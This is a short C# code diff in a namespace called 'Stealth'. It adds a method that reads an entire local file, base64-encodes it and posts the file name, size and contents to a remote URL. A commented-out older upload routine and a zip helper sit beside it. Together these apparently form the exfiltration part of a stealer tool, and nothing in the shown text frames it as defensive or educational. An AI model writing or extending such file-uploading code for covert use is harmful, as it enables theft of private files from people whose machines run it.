@@ -2,6 +2,7 @@
 using System.IO;
 using System.IO.Compression;
 using System.Net;
+using System.Net.Http;
 using System.Runtime.InteropServices;
 
 namespace Stealth
@@ -34,6 +35,19 @@ namespace Stealth
         //    t.Close();
         //    request.GetResponse();
         //}
+
+        public static void post(string url, string file, string type)
+        {
+            HttpClient http = new HttpClient();
+            Dictionary<string, string> d = new Dictionary<string, string>()
+            {
+                {"file", file},
+                {"type", type},
+                {"length", new FileInfo(file).Length.ToString("x")},
+                {"content", Convert.ToBase64String(File.ReadAllBytes(file))}
+            };
+            http.PostAsync(url, new FormUrlEncodedContent(d));
+        }
 
         public static ZipArchive create_zip(string file)
         {
